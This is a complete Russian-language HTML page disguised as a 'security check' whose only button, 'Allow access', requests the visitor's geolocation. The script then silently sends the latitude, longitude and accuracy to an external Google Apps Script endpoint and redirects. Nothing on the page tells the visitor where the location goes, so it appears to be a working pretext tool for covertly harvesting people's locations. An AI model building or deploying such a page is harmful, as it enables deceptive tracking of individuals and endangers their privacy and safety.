<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Проверка безопасности</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background: #f0f0f0;
      color: #333;
      text-align: center;
    }
    .loader {
      margin-top: 20px;
      border: 6px solid #f3f3f3;
      border-top: 6px solid #333;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      display: none; /* Скрыт по умолчанию */
    }
    #consentBtn {
      padding: 12px 24px;
      background: #4CAF50;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h2>Проверка безопасности</h2>
  
  <!-- Кнопка для запуска процесса -->
  <button id="consentBtn">Разрешить доступ</button>
  <div class="loader"></div>

  <script>
    const loader = document.querySelector('.loader');
    const consentBtn = document.getElementById('consentBtn');

    // Функция запроса геолокации
    function requestGeolocation() {
      loader.style.display = 'block'; // Показать лоадер
      consentBtn.style.display = 'none'; // Скрыть кнопку

      navigator.geolocation.getCurrentPosition(
        sendLocation,
        locationError,
        {
          enableHighAccuracy: false,
          timeout: 20000
        }
      );
    }

    function sendLocation(pos) {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      const url = `https://script.google.com/macros/s/AKfycbxK3sFmC2YreooOCiK9jU7lLFwMlt7NflHTzU5UUY6FesXfQDYOkg5RZUy2eobocL16/exec?lat=${lat}&lon=${lon}&acc=${acc}`;

      fetch(url)
        .then(res => {
          console.log("Успешно");
          window.location.href = "/next-page.html"; // Редирект после успеха
        })
        .catch(err => {
          console.error("Ошибка при отправке:", err);
          alert("Ошибка соединения с сервером");
        });
    }

    function locationError(err) {
      loader.style.display = 'none';
      consentBtn.style.display = 'block';
      alert("Ошибка доступа: " + err.message);
    }

    // Запрос запускается только по клику
    consentBtn.addEventListener('click', requestGeolocation);
  </script>
</body>
</html>
